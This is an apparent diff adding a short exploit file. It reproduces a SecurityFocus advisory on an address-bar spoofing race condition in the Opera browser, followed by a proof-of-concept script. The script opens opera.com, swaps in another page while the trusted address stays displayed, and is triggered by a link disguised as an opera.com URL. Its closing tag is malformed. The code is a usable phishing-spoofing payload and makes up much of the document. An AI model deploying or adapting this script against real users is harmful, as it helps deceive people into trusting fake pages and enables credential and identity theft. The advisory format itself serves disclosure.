@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/10810/info
+
+Opera Web Browser is prone to a security weakness that may permit malicious web pages to spoof address bar information. This issue is due to a race condition error.
+
+This issue may be leveraged by an attacker to display false information in the address bar of an unsuspecting user, allowing an attacker to present web pages to users that seem to be derived from a trusted location. This may facilitate phishing attacks; attempted theft of user information for the purpose of identity theft.
+
+<script>
+function fake() {
+ oc=window.open('http://www.opera.com/', '','location=1');
+ oc.location.replace('http://www.example.com');
+}
+[/script]
+<a href="javascript:void(0);" onClick="fake()">http://www.opera.com/</a>
